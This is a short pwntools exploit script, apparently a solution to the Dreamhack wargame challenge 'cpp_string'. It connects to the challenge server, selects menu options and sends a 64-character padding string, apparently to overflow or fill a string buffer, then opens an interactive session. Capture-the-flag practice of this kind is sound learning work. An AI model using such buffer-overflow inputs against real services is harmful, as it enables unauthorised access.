from pwn import *
context.update(log_level = 'debug')
#p = process('cpp_string')
p = remote('host1.dreamhack.games', 11337)

p.sendlineafter(': ', '1')
p.sendlineafter(': ', '2')
p.sendlineafter(': ', 'a'*64)
p.sendlineafter(': ', '3')
p.interactive()

